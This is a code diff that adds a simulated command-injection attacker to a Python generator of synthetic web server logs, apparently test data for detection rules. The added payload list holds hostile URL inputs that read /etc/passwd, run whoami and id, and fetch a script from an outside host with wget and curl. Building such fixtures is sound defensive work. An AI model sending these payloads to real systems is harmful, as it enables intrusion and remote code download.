@@ -162,6 +162,26 @@ def gen_web_log(path: str):
         payload = random.choice(trav_payloads)
         lines.append((ts, fmt_web(trav_ip, ts, 'GET', payload, 403, 0, agent)))
 
+    # ── Command injection attacker ────────────────────────────────────────────
+    # Shell metacharacters followed by an actual command. Note the contrast
+    # with the SQLi payloads above, which also contain semicolons: a rule that
+    # fires on the punctuation alone cannot tell these apart, and will report
+    # the SQLi traffic as command injection.
+    cmdi_ip = '172.16.0.55'
+    cmdi_payloads = [
+        '/ping?host=8.8.8.8;cat /etc/passwd',
+        '/tools/dns?domain=example.com|whoami',
+        '/diag?target=127.0.0.1 && wget http://198.51.100.5/s.sh',
+        '/exec?cmd=$(id)',
+        '/report?name=`uname -a`',
+        '/api/convert?file=doc.pdf;/bin/sh -c "curl http://198.51.100.5"',
+    ]
+    cmdi_ts = datetime(2025, 1, 10, 3, 30, 0)
+    for i in range(18):
+        ts      = cmdi_ts + timedelta(seconds=i * 25)
+        payload = random.choice(cmdi_payloads)
+        lines.append((ts, fmt_web(cmdi_ip, ts, 'GET', payload, 500, 0, agent)))
+
     # ── Scanner (many 404s in rapid succession) ───────────────────────────────
     scanner_ip    = '192.168.99.1'
     scanner_agent = 'Nikto/2.1.6'   # Nikto is a well-known web vulnerability scanner
